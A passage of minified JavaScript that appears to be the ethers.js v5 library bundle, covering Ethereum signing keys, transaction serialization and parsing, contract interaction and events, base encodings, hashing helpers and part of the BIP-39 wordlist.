Vg({recoveryParam:n.recoveryParam,r:Xi("0x"+n.r.toString(16),32),s:Xi("0x"+n.s.toString(16),32)})}computeSharedSecret(e){const t=sd().keyFromPrivate(ze(this.privateKey)),i=sd().keyFromPublic(ze(Mx(e)));return Xi("0x"+t.derive(i.getPublic()).toString(16),32)}static isSigningKey(e){return!!(e&&e._isSigningKey)}}function y$(r,e){const t=Vg(e),i={r:ze(t.r),s:ze(t.s)};return"0x"+sd().recoverPubKey(ze(r),i,t.recoveryParam).encode("hex",!1)}function Mx(r,e){const t=ze(r);if(t.length===32){const i=new N1(t);return e?"0x"+sd().keyFromPrivate(t).getPublic(!0,"hex"):i.publicKey}else{if(t.length===33)return e?Qe(t):"0x"+sd().keyFromPublic(t).getPublic(!1,"hex");if(t.length===65)return e?"0x"+sd().keyFromPublic(t).getPublic(!0,"hex"):Qe(t)}return KT.throwArgumentError("invalid public or private key","key","[REDACTED]")}const Xle=Object.freeze(Object.defineProperty({__proto__:null,SigningKey:N1,computePublicKey:Mx,recoverPublicKey:y$},Symbol.toStringTag,{value:"Module"})),eue="transactions/5.8.0",Oo=new be(eue);var GT;(function(r){r[r.legacy=0]="legacy",r[r.eip2930=1]="eip2930",r[r.eip1559=2]="eip1559"})(GT||(GT={}));function x$(r){return r==="0x"?null:Oi(r)}function $o(r){return r==="0x"?vZ:Ge.from(r)}const tue=[{name:"nonce",maxLength:32,numeric:!0},{name:"gasPrice",maxLength:32,numeric:!0},{name:"gasLimit",maxLength:32,numeric:!0},{name:"to",length:20},{name:"value",maxLength:32,numeric:!0},{name:"data"}],rue={chainId:!0,data:!0,gasLimit:!0,gasPrice:!0,nonce:!0,to:!0,type:!0,value:!0};function Ff(r){const e=Mx(r);return Oi(Nn(Ui(Nn(e,1)),12))}function Jy(r,e){return Ff(y$(ze(r),e))}function ic(r,e){const t=bd(Ge.from(r).toHexString());return t.length>32&&Oo.throwArgumentError("invalid length for "+e,"transaction:"+e,r),t}function e_(r,e){return{address:Oi(r),storageKeys:(e||[]).map((t,i)=>(Ad(t)!==32&&Oo.throwArgumentError("invalid access list storageKey",`accessList[${r}:${i}]`,t),t.toLowerCase()))}}function Zg(r){if(Array.isArray(r))return r.map((t,i)=>Array.isArray(t)?(t.length>2&&Oo.throwArgumentError("access list expected to be [ address, storageKeys[] ]",`value[${i}]`,t),e_(t[0],t[1])):e_(t.address,t.storageKeys));const e=Object.keys(r).map(t=>{const i=r[t].reduce((n,s)=>(n[s]=!0,n),{});return e_(t,Object.keys(i).sort())});return e.sort((t,i)=>t.address.localeCompare(i.address)),e}function HZ(r){return Zg(r).map(e=>[e.address,e.storageKeys])}function VZ(r,e){if(r.gasPrice!=null){const i=Ge.from(r.gasPrice),n=Ge.from(r.maxFeePerGas||0);i.eq(n)||Oo.throwArgumentError("mismatch EIP-1559 gasPrice != maxFeePerGas","tx",{gasPrice:i,maxFeePerGas:n})}const t=[ic(r.chainId||0,"chainId"),ic(r.nonce||0,"nonce"),ic(r.maxPriorityFeePerGas||0,"maxPriorityFeePerGas"),ic(r.maxFeePerGas||0,"maxFeePerGas"),ic(r.gasLimit||0,"gasLimit"),r.to!=null?Oi(r.to):"0x",ic(r.value||0,"value"),r.data||"0x",HZ(r.accessList||[])];if(e){const i=Vg(e);t.push(ic(i.recoveryParam,"recoveryParam")),t.push(bd(i.r)),t.push(bd(i.s))}return Wo(["0x02",H1(t)])}function KZ(r,e){const t=[ic(r.chainId||0,"chainId"),ic(r.nonce||0,"nonce"),ic(r.gasPrice||0,"gasPrice"),ic(r.gasLimit||0,"gasLimit"),r.to!=null?Oi(r.to):"0x",ic(r.value||0,"value"),r.data||"0x",HZ(r.accessList||[])];if(e){const i=Vg(e);t.push(ic(i.recoveryParam,"recoveryParam")),t.push(bd(i.r)),t.push(bd(i.s))}return Wo(["0x01",H1(t)])}function iue(r,e){o$(r,rue);const t=[];tue.forEach(function(o){let a=r[o.name]||[];const c={};o.numeric&&(c.hexPad="left"),a=ze(Qe(a,c)),o.length&&a.length!==o.length&&a.length>0&&Oo.throwArgumentError("invalid length for "+o.name,"transaction:"+o.name,a),o.maxLength&&(a=bd(a),a.length>o.maxLength&&Oo.throwArgumentError("invalid length for "+o.name,"transaction:"+o.name,a)),t.push(Qe(a))});let i=0;if(r.chainId!=null?(i=r.chainId,typeof i!="number"&&Oo.throwArgumentError("invalid transaction.chainId","transaction",r)):e&&!Vy(e)&&e.v>28&&(i=Math.floor((e.v-35)/2)),i!==0&&(t.push(Qe(i)),t.push("0x"),t.push("0x")),!e)return H1(t);const n=Vg(e);let s=27+n.recoveryParam;return i!==0?(t.pop(),t.pop(),t.pop(),s+=i*2+8,n.v>28&&n.v!==s&&Oo.throwArgumentError("transaction.chainId/signature.v mismatch","signature",e)):n.v!==s&&Oo.throwArgumentError("transaction.chainId/signature.v mismatch","signature",e),t.push(Qe(s)),t.push(bd(ze(n.r))),t.push(bd(ze(n.s))),H1(t)}function ZT(r,e){if(r.type==null||r.type===0)return r.accessList!=null&&Oo.throwArgumentError("untyped transactions do not support accessList; include type: 1","transaction",r),iue(r,e);switch(r.type){case 1:return KZ(r,e);case 2:return VZ(r,e)}return Oo.throwError(`unsupported transaction type: ${r.type}`,be.errors.UNSUPPORTED_OPERATION,{operation:"serializeTransaction",transactionType:r.type})}function GZ(r,e,t){try{const i=$o(e[0]).toNumber();if(i!==0&&i!==1)throw new Error("bad recid");r.v=i}catch{Oo.throwArgumentError("invalid v for transaction type: 1","v",e[0])}r.r=Xi(e[1],32),r.s=Xi(e[2],32);try{const i=Ui(t(r));r.from=Jy(i,{r:r.r,s:r.s,recoveryParam:r.v})}catch{}}function nue(r){const e=kx(r.slice(1));e.length!==9&&e.length!==12&&Oo.throwArgumentError("invalid component count for transaction type: 2","payload",Qe(r));const t=$o(e[2]),i=$o(e[3]),n={type:2,chainId:$o(e[0]).toNumber(),nonce:$o(e[1]).toNumber(),maxPriorityFeePerGas:t,maxFeePerGas:i,gasPrice:null,gasLimit:$o(e[4]),to:x$(e[5]),value:$o(e[6]),data:e[7],accessList:Zg(e[8])};return e.length===9||(n.hash=Ui(r),GZ(n,e.slice(9),VZ)),n}function sue(r){const e=kx(r.slice(1));e.length!==8&&e.length!==11&&Oo.throwArgumentError("invalid component count for transaction type: 1","payload",Qe(r));const t={type:1,chainId:$o(e[0]).toNumber(),nonce:$o(e[1]).toNumber(),gasPrice:$o(e[2]),gasLimit:$o(e[3]),to:x$(e[4]),value:$o(e[5]),data:e[6],accessList:Zg(e[7])};return e.length===8||(t.hash=Ui(r),GZ(t,e.slice(8),KZ)),t}function oue(r){const e=kx(r);e.length!==9&&e.length!==6&&Oo.throwArgumentError("invalid raw transaction","rawTransaction",r);const t={nonce:$o(e[0]).toNumber(),gasPrice:$o(e[1]),gasLimit:$o(e[2]),to:x$(e[3]),value:$o(e[4]),data:e[5],chainId:0};if(e.length===6)return t;try{t.v=Ge.from(e[6]).toNumber()}catch{return t}if(t.r=Xi(e[7],32),t.s=Xi(e[8],32),Ge.from(t.r).isZero()&&Ge.from(t.s).isZero())t.chainId=t.v,t.v=0;else{t.chainId=Math.floor((t.v-35)/2),t.chainId<0&&(t.chainId=0);let i=t.v-27;const n=e.slice(0,6);t.chainId!==0&&(n.push(Qe(t.chainId)),n.push("0x"),n.push("0x"),i-=t.chainId*2+8);const s=Ui(H1(n));try{t.from=Jy(s,{r:Qe(t.r),s:Qe(t.s),recoveryParam:i})}catch{}t.hash=Ui(r)}return t.type=null,t}function ZZ(r){const e=ze(r);if(e[0]>127)return oue(e);switch(e[0]){case 1:return sue(e);case 2:return nue(e)}return Oo.throwError(`unsupported transaction type: ${e[0]}`,be.errors.UNSUPPORTED_OPERATION,{operation:"parseTransaction",transactionType:e[0]})}const aue=Object.freeze(Object.defineProperty({__proto__:null,get TransactionTypes(){return GT},accessListify:Zg,computeAddress:Ff,parse:ZZ,recoverAddress:Jy,serialize:ZT},Symbol.toStringTag,{value:"Module"})),cue="contracts/5.8.0";var V1=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const Kn=new be(cue);function j9(r,e){return V1(this,void 0,void 0,function*(){const t=yield e;typeof t!="string"&&Kn.throwArgumentError("invalid address or ENS name","name",t);try{return Oi(t)}catch{}r||Kn.throwError("a provider or signer is needed to resolve ENS names",be.errors.UNSUPPORTED_OPERATION,{operation:"resolveName"});const i=yield r.resolveName(t);return i==null&&Kn.throwArgumentError("resolver or addr is not configured for ENS name","name",t),i})}function V8(r,e,t){return V1(this,void 0,void 0,function*(){return Array.isArray(t)?yield Promise.all(t.map((i,n)=>V8(r,Array.isArray(e)?e[n]:e[i.name],i))):t.type==="address"?yield j9(r,e):t.type==="tuple"?yield V8(r,e,t.components):t.baseType==="array"?Array.isArray(e)?yield Promise.all(e.map(i=>V8(r,i,t.arrayChildren))):Promise.reject(Kn.makeError("invalid value for array",be.errors.INVALID_ARGUMENT,{argument:"value",value:e})):e})}function Dx(r,e,t){return V1(this,void 0,void 0,function*(){let i={};t.length===e.inputs.length+1&&typeof t[t.length-1]=="object"&&(i=ds(t.pop())),Kn.checkArgumentCount(t.length,e.inputs.length,"passed to contract"),r.signer?i.from?i.from=Un({override:j9(r.signer,i.from),signer:r.signer.getAddress()}).then(l=>V1(this,void 0,void 0,function*(){return Oi(l.signer)!==l.override&&Kn.throwError("Contract with a Signer cannot override from",be.errors.UNSUPPORTED_OPERATION,{operation:"overrides.from"}),l.override})):i.from=r.signer.getAddress():i.from&&(i.from=j9(r.provider,i.from));const n=yield Un({args:V8(r.signer||r.provider,t,e.inputs),address:r.resolvedAddress,overrides:Un(i)||{}}),s=r.interface.encodeFunctionData(e,n.args),o={data:s,to:n.address},a=n.overrides;if(a.nonce!=null&&(o.nonce=Ge.from(a.nonce).toNumber()),a.gasLimit!=null&&(o.gasLimit=Ge.from(a.gasLimit)),a.gasPrice!=null&&(o.gasPrice=Ge.from(a.gasPrice)),a.maxFeePerGas!=null&&(o.maxFeePerGas=Ge.from(a.maxFeePerGas)),a.maxPriorityFeePerGas!=null&&(o.maxPriorityFeePerGas=Ge.from(a.maxPriorityFeePerGas)),a.from!=null&&(o.from=a.from),a.type!=null&&(o.type=a.type),a.accessList!=null&&(o.accessList=Zg(a.accessList)),o.gasLimit==null&&e.gas!=null){let l=21e3;const u=ze(s);for(let d=0;d<u.length;d++)l+=4,u[d]&&(l+=64);o.gasLimit=Ge.from(e.gas).add(l)}if(a.value){const l=Ge.from(a.value);!l.isZero()&&!e.payable&&Kn.throwError("non-payable method cannot override value",be.errors.UNSUPPORTED_OPERATION,{operation:"overrides.value",value:i.value}),o.value=l}a.customData&&(o.customData=ds(a.customData)),a.ccipReadEnabled&&(o.ccipReadEnabled=!!a.ccipReadEnabled),delete i.nonce,delete i.gasLimit,delete i.gasPrice,delete i.from,delete i.value,delete i.type,delete i.accessList,delete i.maxFeePerGas,delete i.maxPriorityFeePerGas,delete i.customData,delete i.ccipReadEnabled;const c=Object.keys(i).filter(l=>i[l]!=null);return c.length&&Kn.throwError(`cannot override ${c.map(l=>JSON.stringify(l)).join(",")}`,be.errors.UNSUPPORTED_OPERATION,{operation:"overrides",overrides:c}),o})}function lue(r,e){return function(...t){return Dx(r,e,t)}}function uue(r,e){const t=r.signer||r.provider;return function(...i){return V1(this,void 0,void 0,function*(){t||Kn.throwError("estimate require a provider or signer",be.errors.UNSUPPORTED_OPERATION,{operation:"estimateGas"});const n=yield Dx(r,e,i);return yield t.estimateGas(n)})}}function due(r,e){const t=e.wait.bind(e);e.wait=i=>t(i).then(n=>(n.events=n.logs.map(s=>{let o=Id(s),a=null;try{a=r.interface.parseLog(s)}catch{}return a&&(o.args=a.args,o.decode=(c,l)=>r.interface.decodeEventLog(a.eventFragment,c,l),o.event=a.name,o.eventSignature=a.signature),o.removeListener=()=>r.provider,o.getBlock=()=>r.provider.getBlock(n.blockHash),o.getTransaction=()=>r.provider.getTransaction(n.transactionHash),o.getTransactionReceipt=()=>Promise.resolve(n),o}),n))}function YZ(r,e,t){const i=r.signer||r.provider;return function(...n){return V1(this,void 0,void 0,function*(){let s;if(n.length===e.inputs.length+1&&typeof n[n.length-1]=="object"){const c=ds(n.pop());c.blockTag!=null&&(s=yield c.blockTag),delete c.blockTag,n.push(c)}r.deployTransaction!=null&&(yield r._deployed(s));const o=yield Dx(r,e,n),a=yield i.call(o,s);try{let c=r.interface.decodeFunctionResult(e,a);return t&&e.outputs.length===1&&(c=c[0]),c}catch(c){throw c.code===be.errors.CALL_EXCEPTION&&(c.address=r.address,c.args=n,c.transaction=o),c}})}}function hue(r,e){return function(...t){return V1(this,void 0,void 0,function*(){r.signer||Kn.throwError("sending a transaction requires a signer",be.errors.UNSUPPORTED_OPERATION,{operation:"sendTransaction"}),r.deployTransaction!=null&&(yield r._deployed());const i=yield Dx(r,e,t),n=yield r.signer.sendTransaction(i);return due(r,n),n})}}function IM(r,e,t){return e.constant?YZ(r,e,t):hue(r,e)}function JZ(r){return r.address&&(r.topics==null||r.topics.length===0)?"*":(r.address||"*")+"@"+(r.topics?r.topics.map(e=>Array.isArray(e)?e.join("|"):e).join(":"):"")}class sv{constructor(e,t){Pe(this,"tag",e),Pe(this,"filter",t),this._listeners=[]}addListener(e,t){this._listeners.push({listener:e,once:t})}removeListener(e){let t=!1;this._listeners=this._listeners.filter(i=>t||i.listener!==e?!0:(t=!0,!1))}removeAllListeners(){this._listeners=[]}listeners(){return this._listeners.map(e=>e.listener)}listenerCount(){return this._listeners.length}run(e){const t=this.listenerCount();return this._listeners=this._listeners.filter(i=>{const n=e.slice();return setTimeout(()=>{i.listener.apply(this,n)},0),!i.once}),t}prepareEvent(e){}getEmit(e){return[e]}}class fue extends sv{constructor(){super("error",null)}}class TM extends sv{constructor(e,t,i,n){const s={address:e};let o=t.getEventTopic(i);n?(o!==n[0]&&Kn.throwArgumentError("topic mismatch","topics",n),s.topics=n.slice()):s.topics=[o],super(JZ(s),s),Pe(this,"address",e),Pe(this,"interface",t),Pe(this,"fragment",i)}prepareEvent(e){super.prepareEvent(e),e.event=this.fragment.name,e.eventSignature=this.fragment.format(),e.decode=(t,i)=>this.interface.decodeEventLog(this.fragment,t,i);try{e.args=this.interface.decodeEventLog(this.fragment,e.data,e.topics)}catch(t){e.args=null,e.decodeError=t}}getEmit(e){const t=hZ(e.args);if(t.length)throw t[0].error;const i=(e.args||[]).slice();return i.push(e),i}}class kM extends sv{constructor(e,t){super("*",{address:e}),Pe(this,"address",e),Pe(this,"interface",t)}prepareEvent(e){super.prepareEvent(e);try{const t=this.interface.parseLog(e);e.event=t.name,e.eventSignature=t.signature,e.decode=(i,n)=>this.interface.decodeEventLog(t.eventFragment,i,n),e.args=t.args}catch{}}}class pue{constructor(e,t,i){Pe(this,"interface",Ta(new.target,"getInterface")(t)),i==null?(Pe(this,"provider",null),Pe(this,"signer",null)):b3.isSigner(i)?(Pe(this,"provider",i.provider||null),Pe(this,"signer",i)):Zy.isProvider(i)?(Pe(this,"provider",i),Pe(this,"signer",null)):Kn.throwArgumentError("invalid signer or provider","signerOrProvider",i),Pe(this,"callStatic",{}),Pe(this,"estimateGas",{}),Pe(this,"functions",{}),Pe(this,"populateTransaction",{}),Pe(this,"filters",{});{const o={};Object.keys(this.interface.events).forEach(a=>{const c=this.interface.events[a];Pe(this.filters,a,(...l)=>({address:this.address,topics:this.interface.encodeFilterTopics(c,l)})),o[c.name]||(o[c.name]=[]),o[c.name].push(a)}),Object.keys(o).forEach(a=>{const c=o[a];c.length===1?Pe(this.filters,a,this.filters[c[0]]):Kn.warn(`Duplicate definition of ${a} (${c.join(", ")})`)})}if(Pe(this,"_runningEvents",{}),Pe(this,"_wrappedEmits",{}),e==null&&Kn.throwArgumentError("invalid contract address or ENS name","addressOrName",e),Pe(this,"address",e),this.provider)Pe(this,"resolvedAddress",j9(this.provider,e));else try{Pe(this,"resolvedAddress",Promise.resolve(Oi(e)))}catch{Kn.throwError("provider is required to use ENS name as contract address",be.errors.UNSUPPORTED_OPERATION,{operation:"new Contract"})}this.resolvedAddress.catch(o=>{});const n={},s={};Object.keys(this.interface.functions).forEach(o=>{const a=this.interface.functions[o];if(s[o]){Kn.warn(`Duplicate ABI entry for ${JSON.stringify(o)}`);return}s[o]=!0;{const c=a.name;n[`%${c}`]||(n[`%${c}`]=[]),n[`%${c}`].push(o)}this[o]==null&&Pe(this,o,IM(this,a,!0)),this.functions[o]==null&&Pe(this.functions,o,IM(this,a,!1)),this.callStatic[o]==null&&Pe(this.callStatic,o,YZ(this,a,!0)),this.populateTransaction[o]==null&&Pe(this.populateTransaction,o,lue(this,a)),this.estimateGas[o]==null&&Pe(this.estimateGas,o,uue(this,a))}),Object.keys(n).forEach(o=>{const a=n[o];if(a.length>1)return;o=o.substring(1);const c=a[0];try{this[o]==null&&Pe(this,o,this[c])}catch{}this.functions[o]==null&&Pe(this.functions,o,this.functions[c]),this.callStatic[o]==null&&Pe(this.callStatic,o,this.callStatic[c]),this.populateTransaction[o]==null&&Pe(this.populateTransaction,o,this.populateTransaction[c]),this.estimateGas[o]==null&&Pe(this.estimateGas,o,this.estimateGas[c])})}static getContractAddress(e){return l$(e)}static getInterface(e){return HT.isInterface(e)?e:new HT(e)}deployed(){return this._deployed()}_deployed(e){return this._deployedPromise||(this.deployTransaction?this._deployedPromise=this.deployTransaction.wait().then(()=>this):this._deployedPromise=this.provider.getCode(this.address,e).then(t=>(t==="0x"&&Kn.throwError("contract not deployed",be.errors.UNSUPPORTED_OPERATION,{contractAddress:this.address,operation:"getDeployed"}),this))),this._deployedPromise}fallback(e){this.signer||Kn.throwError("sending a transactions require a signer",be.errors.UNSUPPORTED_OPERATION,{operation:"sendTransaction(fallback)"});const t=ds(e||{});return["from","to"].forEach(function(i){t[i]!=null&&Kn.throwError("cannot override "+i,be.errors.UNSUPPORTED_OPERATION,{operation:i})}),t.to=this.resolvedAddress,this.deployed().then(()=>this.signer.sendTransaction(t))}connect(e){typeof e=="string"&&(e=new m$(e,this.provider));const t=new this.constructor(this.address,this.interface,e);return this.deployTransaction&&Pe(t,"deployTransaction",this.deployTransaction),t}attach(e){return new this.constructor(e,this.interface,this.signer||this.provider)}static isIndexed(e){return D9.isIndexed(e)}_normalizeRunningEvent(e){return this._runningEvents[e.tag]?this._runningEvents[e.tag]:e}_getRunningEvent(e){if(typeof e=="string"){if(e==="error")return this._normalizeRunningEvent(new fue);if(e==="event")return this._normalizeRunningEvent(new sv("event",null));if(e==="*")return this._normalizeRunningEvent(new kM(this.address,this.interface));const t=this.interface.getEvent(e);return this._normalizeRunningEvent(new TM(this.address,this.interface,t))}if(e.topics&&e.topics.length>0){try{const i=e.topics[0];if(typeof i!="string")throw new Error("invalid topic");const n=this.interface.getEvent(i);return this._normalizeRunningEvent(new TM(this.address,this.interface,n,e.topics))}catch{}const t={address:this.address,topics:e.topics};return this._normalizeRunningEvent(new sv(JZ(t),t))}return this._normalizeRunningEvent(new kM(this.address,this.interface))}_checkRunningEvents(e){if(e.listenerCount()===0){delete this._runningEvents[e.tag];const t=this._wrappedEmits[e.tag];t&&e.filter&&(this.provider.off(e.filter,t),delete this._wrappedEmits[e.tag])}}_wrapEvent(e,t,i){const n=Id(t);return n.removeListener=()=>{i&&(e.removeListener(i),this._checkRunningEvents(e))},n.getBlock=()=>this.provider.getBlock(t.blockHash),n.getTransaction=()=>this.provider.getTransaction(t.transactionHash),n.getTransactionReceipt=()=>this.provider.getTransactionReceipt(t.transactionHash),e.prepareEvent(n),n}_addEventListener(e,t,i){if(this.provider||Kn.throwError("events require a provider or a signer with a provider",be.errors.UNSUPPORTED_OPERATION,{operation:"once"}),e.addListener(t,i),this._runningEvents[e.tag]=e,!this._wrappedEmits[e.tag]){const n=s=>{let o=this._wrapEvent(e,s,t);if(o.decodeError==null)try{const a=e.getEmit(o);this.emit(e.filter,...a)}catch(a){o.decodeError=a.error}e.filter!=null&&this.emit("event",o),o.decodeError!=null&&this.emit("error",o.decodeError,o)};this._wrappedEmits[e.tag]=n,e.filter!=null&&this.provider.on(e.filter,n)}}queryFilter(e,t,i){const n=this._getRunningEvent(e),s=ds(n.filter);return typeof t=="string"&&Jr(t,32)?(i!=null&&Kn.throwArgumentError("cannot specify toBlock with blockhash","toBlock",i),s.blockHash=t):(s.fromBlock=t??0,s.toBlock=i??"latest"),this.provider.getLogs(s).then(o=>o.map(a=>this._wrapEvent(n,a,null)))}on(e,t){return this._addEventListener(this._getRunningEvent(e),t,!1),this}once(e,t){return this._addEventListener(this._getRunningEvent(e),t,!0),this}emit(e,...t){if(!this.provider)return!1;const i=this._getRunningEvent(e),n=i.run(t)>0;return this._checkRunningEvents(i),n}listenerCount(e){return this.provider?e==null?Object.keys(this._runningEvents).reduce((t,i)=>t+this._runningEvents[i].listenerCount(),0):this._getRunningEvent(e).listenerCount():0}listeners(e){if(!this.provider)return[];if(e==null){const t=[];for(let i in this._runningEvents)this._runningEvents[i].listeners().forEach(n=>{t.push(n)});return t}return this._getRunningEvent(e).listeners()}removeAllListeners(e){if(!this.provider)return this;if(e==null){for(const i in this._runningEvents){const n=this._runningEvents[i];n.removeAllListeners(),this._checkRunningEvents(n)}return this}const t=this._getRunningEvent(e);return t.removeAllListeners(),this._checkRunningEvents(t),this}off(e,t){if(!this.provider)return this;const i=this._getRunningEvent(e);return i.removeListener(t),this._checkRunningEvents(i),this}removeListener(e,t){return this.off(e,t)}}class gue extends pue{}class C${constructor(e){Pe(this,"alphabet",e),Pe(this,"base",e.length),Pe(this,"_alphabetMap",{}),Pe(this,"_leader",e.charAt(0));for(let t=0;t<e.length;t++)this._alphabetMap[e.charAt(t)]=t}encode(e){let t=ze(e);if(t.length===0)return"";let i=[0];for(let s=0;s<t.length;++s){let o=t[s];for(let a=0;a<i.length;++a)o+=i[a]<<8,i[a]=o%this.base,o=o/this.base|0;for(;o>0;)i.push(o%this.base),o=o/this.base|0}let n="";for(let s=0;t[s]===0&&s<t.length-1;++s)n+=this._leader;for(let s=i.length-1;s>=0;--s)n+=this.alphabet[i[s]];return n}decode(e){if(typeof e!="string")throw new TypeError("Expected String");let t=[];if(e.length===0)return new Uint8Array(t);t.push(0);for(let i=0;i<e.length;i++){let n=this._alphabetMap[e[i]];if(n===void 0)throw new Error("Non-base"+this.base+" character");let s=n;for(let o=0;o<t.length;++o)s+=t[o]*this.base,t[o]=s&255,s>>=8;for(;s>0;)t.push(s&255),s>>=8}for(let i=0;e[i]===this._leader&&i<e.length-1;++i)t.push(0);return ze(new Uint8Array(t.reverse()))}}const mue=new C$("abcdefghijklmnopqrstuvwxyz234567"),pw=new C$("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"),wue=Object.freeze(Object.defineProperty({__proto__:null,Base32:mue,Base58:pw,BaseX:C$},Symbol.toStringTag,{value:"Module"}));var gw;(function(r){r.sha256="sha256",r.sha512="sha512"})(gw||(gw={}));const bue="sha2/5.8.0",vue=new be(bue);function QZ(r){return"0x"+ya.ripemd160().update(ze(r)).digest("hex")}function a0(r){return"0x"+ya.sha256().update(ze(r)).digest("hex")}function yue(r){return"0x"+ya.sha512().update(ze(r)).digest("hex")}function ov(r,e,t){return gw[r]||vue.throwError("unsupported algorithm "+r,be.errors.UNSUPPORTED_OPERATION,{operation:"hmac",algorithm:r}),"0x"+ya.hmac(ya[r],ze(e)).update(ze(t)).digest("hex")}const xue=Object.freeze(Object.defineProperty({__proto__:null,get SupportedAlgorithm(){return gw},computeHmac:ov,ripemd160:QZ,sha256:a0,sha512:yue},Symbol.toStringTag,{value:"Module"}));function E$(r,e,t,i,n){r=ze(r),e=ze(e);let s,o=1;const a=new Uint8Array(i),c=new Uint8Array(e.length+4);c.set(e);let l,u;for(let d=1;d<=o;d++){c[e.length]=d>>24&255,c[e.length+1]=d>>16&255,c[e.length+2]=d>>8&255,c[e.length+3]=d&255;let h=ze(ov(n,r,c));s||(s=h.length,u=new Uint8Array(s),o=Math.ceil(i/s),l=i-(o-1)*s),u.set(h);for(let g=1;g<t;g++){h=ze(ov(n,r,h));for(let w=0;w<s;w++)u[w]^=h[w]}const f=(d-1)*s,p=d===o?l:s;a.set(ze(u).slice(0,p),f)}return Qe(a)}const Cue="wordlists/5.8.0",Eue=new be(Cue);class Qy{constructor(e){Eue.checkAbstract(new.target,Qy),Pe(this,"locale",e)}split(e){return e.toLowerCase().split(/ +/g)}join(e){return e.join(" ")}static check(e){const t=[];for(let i=0;i<2048;i++){const n=e.getWord(i);if(i!==e.getWordIndex(n))return"0x";t.push(n)}return Pf(t.join(`
`)+`
`)}static register(e,t){t||(t=e.locale)}}const _ue="AbandonAbilityAbleAboutAboveAbsentAbsorbAbstractAbsurdAbuseAccessAccidentAccountAccuseAchieveAcidAcousticAcquireAcrossActActionActorActressActualAdaptAddAddictAddressAdjustAdmitAdultAdvanceAdviceAerobicAffairAffordAfraidAgainAgeAgentAgreeAheadAimAirAirportAisleAlarmAlbumAlcoholAlertAlienAllAlleyAllowAlmostAloneAlphaAlreadyAlsoAlterAlwaysAmateurAmazingAmongAmountAmusedAnalystAnchorAncientAngerAngleAngryAnimalAnkleAnnounceAnnualAnotherAnswerAntennaAntiqueAnxietyAnyApartApologyAppearAppleApproveAprilArchArcticAreaArenaArgueArmArmedArmorArmyAroundArrangeArrestArriveArrowArtArtefactArtistArtworkAskAspectAssaultAssetAssistAssumeAsthmaAthleteAtomAttackAttendAttitudeAttractAuctionAuditAugustAuntAuthorAutoAutumnAverageAvocadoAvoidAwakeAwareAwayAwesomeAwfulAwkwardAxisBabyBachelorBaconBadgeBagBalanceBalconyBallBambooBananaBannerBarBarelyBargainBarrelBaseBasicBasketBattleBeachBeanBeautyBecauseBecomeBeefBeforeBeginBehaveBehindBelieveBelowBeltBenchBenefitBestBetrayBetterBetweenBeyondBicycleBidBikeBindBiologyBirdBirthBitterBlackBladeBlameBlanketBlastBleakBlessBlindBloodBlossomBlouseBlueBlurBlushBoardBoatBodyBoilBombBoneBonusBookBoostBorderBoringBorrowBossBottomBounceBoxBoyBracketBrainBrandBrassBraveBreadBreezeBrickBridgeBriefBrightBringBriskBroccoliBrokenBronzeBroomBrotherBrownBrushBubbleBuddyBudgetBuffaloBuildBulbBulkBulletBundleBunkerBurdenBurgerBurstBusBusinessBusyButterBuyerBuzzCabbageCabinCableCactusCageCakeCallCalmCameraCampCanCanalCancelCandyCannonCanoeCanvasCanyonCapableCapitalCaptainCarCarbonCardCargoCarpetCarryCartCaseCashCasinoCastleCasualCatCatalogCatchCategoryCattleCaughtCauseCautionCaveCeilingCeleryCementCensusCenturyCerealCertainChairChalkChampionChangeChaosChapterChargeChaseChatCheapCheckCheeseChefCherryChestChickenChiefChildChimneyChoiceChooseChronicChuckleChunkChurnCigarCinnamonCircleCitizenCityCivilClaimClapClarifyClawClayCleanClerkCleverClickClientCliffClimbClinicClipClockClogCloseClothCloudClownClubClumpClusterClutchCoachCoastCoconutCodeCoffeeCoilCoinCollectColorColumnCombineComeComfortComicCommonCompanyConcertConductConfirmCongressConnectConsiderControlConvinceCookCoolCopperCopyCoralCoreCornCorrectCostCottonCouchCountryCoupleCourseCousinCoverCoyoteCrackCradleCraftCramCraneCrashCraterCrawlCrazyCreamCreditCreekCrewCricketCrimeCrispCriticCropCrossCrouchCrowdCrucialCruelCruiseCrumbleCrunchCrushCryCrystalCubeCultureCupCupboardCuriousCurrentCurtainCurveCushionCustomCuteCycleDadDamageDampDanceDangerDaringDashDaughterDawnDayDealDebateDebrisDecadeDecemberDecideDeclineDecorateDecreaseDeerDefenseDefineDefyDegreeDelayDeliverDemandDemiseDenialDentistDenyDepartDependDepositDepthDeputyDeriveDescribeDesertDesignDeskDespairDestroyDetailDetectDevelopDeviceDevoteDiagramDialDiamondDiaryDiceDieselDietDifferDigitalDignityDilemmaDinnerDinosaurDirectDirtDisagreeDiscoverDiseaseDishDismissDisorderDisplayDistanceDivertDivideDivorceDizzyDoctorDocumentDogDollDolphinDomainDonateDonkeyDonorDoorDoseDoubleDoveDraftDragonDramaDrasticDrawDreamDressDriftDrillDrinkDripDriveDropDrumDryDuckDumbDuneDuringDustDutchDutyDwarfDynamicEagerEagleEarlyEarnEarthEasilyEastEasyEchoEcologyEconomyEdgeEditEducateEffortEggEightEitherElbowElderElectricElegantElementElephantElevatorEliteElseEmbarkEmbodyEmbraceEmergeEmotionEmployEmpowerEmptyEnableEnactEndEndlessEndorseEnemyEnergyEnforceEngageEngineEnhanceEnjoyEnlistEnoughEnrichEnrollEnsureEnterEntireEntryEnvelopeEpisodeEqualEquipEraEraseErodeErosionErrorEruptEscapeEssayEssenceEstateEternalEthicsEvidenceEvilEvokeEvolveExactExampleExcessExchangeExciteExcludeExcuseExecuteExerciseExhaustExhibitExileExistExitExoticExpandExpectExpireExplainExposeExpressExtendExtraEyeEyebrowFabricFaceFacultyFadeFaintFaithFallFalseFameFamilyFamousFanFancyFantasyFarmFashionFatFatalFatherFatigueFaultFavoriteFeatureFebruaryFederalFeeFeedFeelFemaleFenceFestivalFetchFeverFewFiberFictionFieldFigureFileFilmFilterFinalFindFineFingerFinishFireFirmFirstFiscalFishFitFitnessFixFlagFlameFlashFlatFlavorFleeFlightFlipFloatFlockFloorFlowerFluidFlushFlyFoamFocusFogFoilFoldFollowFoodFootForceForestForgetForkFortuneForumForwardFossilFosterFoundFoxFragileFrameFrequentFreshFriendFringeFrogFrontFrostFrownFrozenFruitFuel